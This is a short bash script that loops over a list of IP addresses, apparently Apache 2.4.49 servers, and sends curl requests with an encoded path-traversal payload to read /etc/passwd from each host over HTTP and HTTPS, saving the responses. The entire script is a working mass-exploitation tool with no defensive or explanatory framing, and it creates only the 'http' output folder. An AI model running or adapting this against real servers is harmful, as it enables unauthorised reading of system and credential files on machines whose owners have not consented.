#!/bin/bash

mkdir "http"

while read p
do
    if [ -f "http/$p" ]; then
        echo "http/$p exists."
    else
        curl -X GET -k -s --max-time 10 --path-as-is "http://$p/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" -o http/$p -vv
    fi
    if [ -f "https/$p" ]; then
        echo "https/$p exists."
    else
        curl -X GET -k -s --max-time 10 --path-as-is "https://$p/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" -o https/$p -vv
    fi

done < "apache-2.4.49-ip"

